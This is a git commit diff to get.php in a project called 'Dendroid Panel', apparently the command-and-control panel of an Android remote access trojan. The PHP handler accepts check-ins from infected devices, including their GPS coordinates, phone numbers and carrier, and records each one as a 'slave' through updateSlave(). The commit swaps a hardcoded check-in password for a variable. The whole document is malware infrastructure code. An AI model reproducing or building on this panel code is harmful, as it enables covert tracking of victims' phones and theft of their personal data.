ee4d37bacf3f17e9a999314a710d147a5dce56b8
gitPoc32 <gitPoc32@users.noreply.github.com>
2014-08-17 19:45:24 +0000

    Update get.php

--- master/Dendroid Panel/Dendroid Panel/Panel/get.php
+++ master/Dendroid Panel/Dendroid Panel/Panel/get.php
@@ -3,7 +3,7 @@
 include("functions.php");
 
 if(isset($_GET['UID'], $_GET['Device'], $_GET['Version'], $_GET['Coordinates'], $_GET['Provider'], $_GET['Phone_Number'], $_GET['Password'], $_GET['Sdk'], $_GET['Random'])){
-	if($_GET['Password'] == "keylimepie"){
+	if($_GET['Password'] == $passwords){
 		updateSlave($_GET['UID'], $_GET['Device'], $_GET['Version'], $_GET['Coordinates'], $_GET['Provider'], $_GET['Phone_Number'], $_GET['Sdk'], $_GET['Random']);
 	} else {
 		echo("Wrong Password!");
